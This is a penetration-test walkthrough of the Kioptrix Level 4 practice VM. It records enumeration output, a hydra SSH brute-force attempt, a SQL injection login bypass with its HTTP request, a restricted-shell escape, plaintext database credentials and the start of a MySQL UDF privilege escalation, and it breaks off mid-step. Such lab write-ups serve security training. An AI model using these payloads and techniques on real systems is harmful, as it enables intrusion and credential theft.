# level 4

| Proto | port    | Service/URL                         | Info                                                                  | Potential Vulns | Verified Vulns |
|-------|---------|-------------------------------------|-----------------------------------------------------------------------|-----------------|----------------|
|       |         | system                              | Ubuntu 8.04.3 LTS Linux 2.6.24-24 <br> Workgroup: WORKGROUP <br> Domain: localdomain <br> FQDN: Kioptrix4.localdomain <br> Account Lockout Threshold: None <br> Users: nobody,robert,root,john,loneferret <br> | [dirty cow](https://github.com/FireFart/dirtycow/blob/master/dirty.c) | dirty cow |
| TCP   | 22      | ssh                                 | OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) <br> |
| TCP   | 80      | http                                | Apache httpd 2.2.8 ((Ubuntu) <br> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) <br> |
| UDP   | 137     | netbios-ns                          | Microsoft Windows netbios-ns (workgroup: WORKGROUP) |
| TCP   | 139     | netbios-ssn                         | Samba smbd 3.X - 4.X <br> | 
| TCP   | 445     | netbios-ssn                         | Samba smbd 3.0.28a <br> print$ - no access <br> IPC$ - Anonymous access <br>   |
|       |         | mysql                               | Running as root. | [User-Defined Function (UDF) Dynamic Library (2)](https://www.exploit-db.com/exploits/1518) | UDF |


## Enum

### Where you at

```
nmap -sn -PR 192.168.88.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:15 CET
Nmap scan report for 192.168.88.2
Host is up (0.000070s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.132
Host is up (0.00037s latency).
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Nmap scan report for 192.168.88.254
Host is up (0.00011s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.78 seconds
```

### TCP

```
nmap -p- -A 192.168.88.132 -oA tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:16 CET
Nmap scan report for 192.168.88.132
Host is up (0.00046s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m02s, deviation: 3h32m07s, median: 2s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2020-01-04T11:17:19-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.46 ms 192.168.88.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.01 seconds
```

### UDP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 17:17 CET
Stats: 0:10:22 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 67.18% done; ETC: 17:32 (0:05:03 remaining)
Nmap scan report for 192.168.88.132
Host is up (0.00052s latency).
Not shown: 951 closed ports, 48 open|filtered ports
PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP)
MAC Address: 00:0C:29:F2:50:A8 (VMware)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: KIOPTRIX4; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.88.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1353.84 seconds
```

### 192.168.88.132 - 80

#### gobuster

```
~/go/bin/gobuster dir -u http://192.168.88.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,sql  -t 40 -e 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.132
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt,sql
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/04 20:54:38 Starting gobuster
===============================================================
http://192.168.88.132/images (Status: 301)
http://192.168.88.132/index (Status: 200)
http://192.168.88.132/index.php (Status: 200)
http://192.168.88.132/member (Status: 302)
http://192.168.88.132/member.php (Status: 302)
http://192.168.88.132/database.sql (Status: 200)
http://192.168.88.132/logout (Status: 302)
http://192.168.88.132/logout.php (Status: 302)
http://192.168.88.132/john (Status: 301)
http://192.168.88.132/robert (Status: 301)
http://192.168.88.132/server-status (Status: 403)
===============================================================
2020/01/04 20:55:52 Finished
===============================================================
```

http://192.168.88.132/database.sql

```
CREATE TABLE `members` (
`id` int(4) NOT NULL auto_increment,
`username` varchar(65) NOT NULL default '',
`password` varchar(65) NOT NULL default '',
PRIMARY KEY (`id`)
) TYPE=MyISAM AUTO_INCREMENT=2 ;

-- 
-- Dumping data for table `members`
-- 

INSERT INTO `members` VALUES (1, 'john', '1234');
```

### 192.168.88.132 - 139/445

#### smbclient

```
smbclient -L \\\\192.168.88.132\\                                                                                                                           
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4

```

```
smbclient \\\\192.168.88.132\\IPC$
Enter WORKGROUP\root's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
```

```
smbclient \\\\192.168.88.132\\print$
Enter WORKGROUP\root's password:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

#### enum4linux

```
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan  4 20:15:14 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.88.132
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.88.132    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.88.132    |
 ============================================== 
Looking up status of 192.168.88.132
        KIOPTRIX4       <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX4       <03> -         B <ACTIVE>  Messenger Service
        KIOPTRIX4       <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.88.132    |
 ======================================= 
[+] Server 192.168.88.132 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.88.132    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.88.132    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.88.132 from smbclient: 
[+] Got OS info for 192.168.88.132 from srvinfo:
        KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x809a03

 =============================== 
|    Users on 192.168.88.132    |
 =============================== 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody   Name: nobody    Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert   Name: ,,,       Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root     Name: root      Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john     Name: ,,,       Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret       Name: loneferret,,,     Desc: (null)

user:[nobody] rid:[0x1f5]
user:[robert] rid:[0xbbc]
user:[root] rid:[0x3e8]
user:[john] rid:[0xbba]
user:[loneferret] rid:[0xbb8]

 =========================================== 
|    Share Enumeration on 192.168.88.132    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4

[+] Attempting to map shares on 192.168.88.132
//192.168.88.132/print$ Mapping: DENIED, Listing: N/A
//192.168.88.132/IPC$   [E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*

 ====================================================== 
|    Password Policy Information for 192.168.88.132    |
 ====================================================== 


[+] Attaching to 192.168.88.132 using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] KIOPTRIX4
        [+] Builtin

[+] Password Info for Domain: KIOPTRIX4

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ================================ 
|    Groups on 192.168.88.132    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.88.132 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\loneferret (Local User)
S-1-22-1-1001 Unix User\john (Local User)
S-1-22-1-1002 Unix User\robert (Local User)
[+] Enumerating users using SID S-1-5-21-2529228035-991147148-3991031631 and logon username '', password ''
S-1-5-21-2529228035-991147148-3991031631-500 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-501 KIOPTRIX4\nobody (Local User)
S-1-5-21-2529228035-991147148-3991031631-502 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-503 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-504 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-505 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-506 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-507 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-508 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-509 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-510 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-511 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-512 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-513 KIOPTRIX4\None (Domain Group)
S-1-5-21-2529228035-991147148-3991031631-514 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-515 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-516 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-517 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-518 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-519 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-520 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-521 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-522 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-523 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-524 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-525 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-526 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-527 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-528 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-529 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-530 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-531 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-532 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-533 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-534 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-535 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-536 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-537 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-538 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-539 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-540 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-541 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-542 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-543 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-544 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-545 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-546 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-547 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-548 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-549 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-550 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1000 KIOPTRIX4\root (Local User)
S-1-5-21-2529228035-991147148-3991031631-1001 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1002 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1003 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1004 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1005 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1006 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1007 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1008 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1009 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1010 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1011 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1012 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1013 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1014 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1015 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1016 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1017 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1018 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1019 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1020 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1021 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1022 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1023 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1024 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1025 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1026 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1027 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1028 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1029 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1030 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1031 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1032 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1033 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1034 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1035 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1036 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1037 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1038 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1039 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1040 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1041 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1042 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1043 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1044 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1045 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1046 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1047 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1048 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1049 *unknown*\*unknown* (8)
S-1-5-21-2529228035-991147148-3991031631-1050 *unknown*\*unknown* (8)

 =============================================== 
|    Getting printer info for 192.168.88.132    |
 =============================================== 
No printers returned.


enum4linux complete on Sat Jan  4 20:15:51 2020
```

## Expliot

### brute-Force

```
user list:

john
robert
loneferret
root
nobody

hydra -v -V -L users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8

....

1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-04 22:09:17

```

### SQLi/Auth bypass

http://192.168.88.132/checklogin.php

user: someuser
pass: ' OR '1'='1' #--

```
POST /checklogin.php HTTP/1.1
Host: 192.168.88.132
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.88.132/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Connection: close
Cookie: PHPSESSID=f3422deb5013adf1dd1883936619abbf
Upgrade-Insecure-Requests: 1

myusername=admin&mypassword=%27+OR+%271%27%3D%271%27+%23--&Submit=Login
```

user: robert
pass: ' OR '1'='1' #--

Member's Control Panel  
Username 	: 	robert  
Password 	: 	ADGAdsafdfwt4gadfga==  

### SSH

#### Escape

```
ssh robert@192.168.88.132
robert@192.168.88.132's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$ echo os.system("/bin/bash")
```

```
robert@Kioptrix4:~$ 
robert@Kioptrix4:~$ cat /var/www/john/john.php 
<?php
session_start();
if(!session_is_registered(myusername)){
        header("location:../index.php");
}else{
ob_start();
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
...

mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 35
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> show tables from members;
+-------------------+
| Tables_in_members |
+-------------------+
| members           | 
+-------------------+
1 row in set (0.00 sec)

mysql> use members
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+
2 rows in set (0.00 sec)

mysql> exit

robert@Kioptrix4:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04.3 LTS
Release:        8.04
Codename:       hardy

robert@Kioptrix4:~$ uname -a
Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux

robert@Kioptrix4:~$ ps aux | grep mysql
root  4825  0.0  0.0   1772   528 ?        S    11:14   0:00 /bin/sh /usr/bin/mysqld_safe
root  4867  0.0  1.5 126988 16340 ?        Sl   11:14   0:06 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-ext
root  4869  0.0  0.0   1700   560 ?        S    11:14   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld



root@kali:~/kioptrix/level4/UDF# searchsploit -m exploits/linux/local/1518.c
  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
      URL: https://www.exploit-db.com/exploits/1518
     Path: /usr/share/exploitdb/exploits/linux/local/1518.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /root/kioptrix/level4/UDF/1518.c


root@kali:~/kioptrix/level4/UDF# 
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c^C
root@kali:~/kioptrix/level4/UDF# mv 1518.c raptor_udf2.c
root@kali:~/kioptrix/level4/UDF# gcc -g -c raptor_udf2.c
